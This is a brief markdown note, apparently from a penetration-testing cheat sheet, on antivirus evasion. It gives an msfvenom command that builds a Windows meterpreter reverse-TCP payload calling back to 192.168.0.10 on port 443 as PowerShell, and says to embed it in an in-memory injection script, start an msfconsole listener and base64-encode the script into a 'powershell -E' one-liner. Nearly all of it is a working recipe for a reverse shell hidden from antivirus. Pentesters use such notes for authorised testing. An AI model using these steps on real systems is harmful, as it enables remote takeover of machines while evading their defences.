# Anti Virus Evasion

Generate a malicious payload for testing with AV:
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=443 -f powershell`

Add the output to  `in_memory_injection.ps1`.

Create a listener in `msfconsole`.

Encode script in base64 and decode as a one liner. `powershell -E XXXX`:  
https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py







